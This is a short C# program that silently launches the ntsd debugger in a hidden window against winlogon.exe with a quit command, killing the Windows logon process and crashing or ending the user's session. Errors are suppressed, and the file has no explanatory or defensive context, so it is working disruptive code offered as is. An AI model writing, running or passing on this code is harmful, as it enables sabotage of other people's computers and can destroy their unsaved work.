using System;
using System.Diagnostics;

namespace NTSD_Winlogon {
    public abstract class Program {
        private static void Main() {
            NTSD_Winlogo();
        }

        public static void NTSD_Winlogo() {
            try {
                var process = new Process();
                var startInfo = new ProcessStartInfo {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = "ntsd.exe",
                    Arguments = "-c q -pn winlogon.exe"
                };
                process.StartInfo = startInfo;
                process.Start();
            } catch (Exception) {
                // ignored
            }
        }
    }
}